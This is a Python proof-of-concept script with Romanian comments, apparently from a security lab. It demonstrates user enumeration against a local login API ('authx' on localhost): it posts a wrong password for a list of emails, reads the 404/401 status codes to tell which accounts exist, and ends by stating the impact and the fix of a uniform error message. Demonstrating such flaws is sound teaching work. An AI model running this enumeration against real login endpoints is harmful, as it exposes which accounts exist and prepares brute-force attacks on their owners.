
"""
User Enumeration
Demonstreaza cum mesajele de eroare diferite permit identificarea
userilor existenti in sistem.
"""

import requests
import time

BASE_URL = "http://localhost:5000"

# Lista de emailuri de testat (mix de existente si inexistente)
EMAILS_TO_TEST = [
    "admin@authx.com",
    "manager@authx.com",
    "no_such_user_xyz@authx.com",
    "ghost@nowhere.com",
    "analyst@authx.com",
    "root@authx.com",
    "test@authx.com",
]

FAKE_PASSWORD = "parolaWrong_999!"

print("=" * 60)
print("PoC 4.4 - User Enumeration via mesaje de eroare diferite")
print("=" * 60)
print(f"Parola folosita (intentionat gresita): {FAKE_PASSWORD}")
print()

existing_users = []
t0 = time.time()

for email in EMAILS_TO_TEST:
    try:
        r = requests.post(
            f"{BASE_URL}/api/login",
            json={"email": email, "password": FAKE_PASSWORD},
            timeout=5
        )
        body = r.json()
        msg = body.get("error", "")
        elapsed_ms = (time.time() - t0) * 1000

        if r.status_code == 404:
            label = "[INEXISTENT]"
        elif r.status_code == 401:
            label = "[EXISTA!   ]"
            existing_users.append(email)
        else:
            label = f"[HTTP {r.status_code}   ]"

        print(f"  {label} {email:<35} -> '{msg}'")
        t0 = time.time()

    except Exception as e:
        print(f"  [EROARE   ] {email} -> {e}")

print()
print("Useri identificati ca existenti in sistem:")
for u in existing_users:
    print(f"  -> {u}")

print()
print("Impact: Atacatorul stie exact pe cine sa targeteze cu brute force.")
print("Fix: Returneaza INTOTDEAUNA acelasi mesaj: 'Credentiale invalide.'")
